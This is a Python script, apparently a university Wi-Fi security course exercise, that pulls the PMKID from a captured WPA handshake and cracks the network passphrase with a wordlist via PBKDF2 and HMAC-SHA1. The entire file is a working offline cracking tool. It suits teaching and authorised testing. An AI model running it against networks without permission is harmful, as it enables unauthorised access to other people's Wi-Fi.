#!/usr/bin/env python
# -*- coding: utf-8 -*-


__author__ = "Abraham Rubinstein et Yann Lederrey. Modifié par David Pellissier et Michael Ruckstuhl"
__copyright__ = "Copyright 2017, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__email__ = "abraham.rubinstein@heig-vd.ch"
__status__ = "Prototype"

import argparse
from binascii import b2a_hex, a2b_hex
from scapy.all import *
from scapy.contrib.wpa_eapol import WPA_key
from pbkdf2 import *


def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


def get_pmkid_packet(packets):
    """
    returns the first packet containing a PMKID value. It is always the first message of a 4-way handshake
    """
    for p in packets:
        # Find the first message of a handshake. It is caracterized by having wpa_key_mic at 0
        if p.haslayer(WPA_key) and not int.from_bytes(p.wpa_key_mic, "big"):  # big or little endian is not important
            return p

    raise Exception("Couldn't find PMKID")


def pmkid_bruteforce(pmkid, ssid, mac_ap, mac_sta, const, wordlist):
    """
    Try to find a collision with the expected PMKID, using the wordlist.
    """
    with open(wordlist) as file1:
        pmkid_expected = b2a_hex(pmkid)

        for passphrase in file1:

            passphrase = passphrase.strip()  # removes \n
            passphrase = str.encode(passphrase)

            # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
            pmk = pbkdf2(hashlib.sha1, passphrase, ssid, 4096, 32)
            # calculate pmkid
            data = const + mac_ap + mac_sta
            pmkid_guess = hmac.new(pmk, data, hashlib.sha1)
            pmkid_guess = bytes(pmkid_guess.hexdigest(), "utf-8")[:-8]

            print(f"\r{passphrase.decode():22} = {pmkid_guess}          ", end="", flush=True)

            if pmkid_guess == pmkid_expected:
                print("")
                return passphrase.decode()

    print("")
    return None


def find_ssid(ap_mac, packets):
    """
    Find the SSID associated with the MAC address of the AP.
    """

    for p in packets:
        if p.haslayer("Dot11AssoReq") and p.addr1 == ap_mac:
            ssid = p.info
            return ssid

    raise Exception("Couldn't find the SSID of this MAC address")


def main(pcap_file, dictionary):
    # Read capture file -- it contains beacon, authentication, association, handshake and data
    print("Reading the file...", end="", flush=True)
    wpa = rdpcap(pcap_file)
    print("OK")

    print("Finding Handshake packet...", end="", flush=True)
    p = get_pmkid_packet(wpa)
    print("OK")

    pmkid = p.wpa_key[-16:]

    ap_mac = p.addr2  # we need the byte value to find the ssid

    print("Finding SSID...", end="")
    ssid = find_ssid(ap_mac, wpa)
    print("OK")

    ap_mac = a2b_hex(ap_mac.replace(':', ''))
    sta_mac = a2b_hex(p.addr1.replace(':', ''))

    const = b'PMK Name'

    print("\nValues used to calculate PMKID")
    print("============================")
    print("PMKID:       ", b2a_hex(pmkid))
    print("AP Mac:      ", b2a_hex(ap_mac))
    print("CLient Mac:  ", b2a_hex(sta_mac))
    print("SSID:        ", ssid)
    print("Constant:    ", const)

    print("\nBruteforcing PMKID")
    print("============================")
    print("Expected PMKID:         ", b2a_hex(pmkid))
    passphrase = pmkid_bruteforce(pmkid, ssid, ap_mac, sta_mac, const, dictionary)

    if passphrase:
        print("Found passphrase:", passphrase)
    else:
        print("Couldn't find the passphrase with this word list.")


if __name__ == "__main__":
    default_wordlist = "wordlists/WiFi-WPA/probable-v2-wpa-top4800.txt"  # https://github.com/Taknok/French-Wordlist

    # just parsing arguments
    parser = argparse.ArgumentParser(
        description="Performs a dictionary-based bruteforce of the passphrase PMKID.",
        epilog="This script was developped as an exercise for the SWI course at HEIG-VD")

    parser.add_argument("pcap",
                        help="Network capture containing the first packet of the WPA handshake, which contains the PMKID")
    parser.add_argument("-d", "--dictionary", default=default_wordlist,
                        help="The dictionary to use for bruteforcing the key. By default, a french wordlist is used")
    args = parser.parse_args()

    main(args.pcap, args.dictionary)
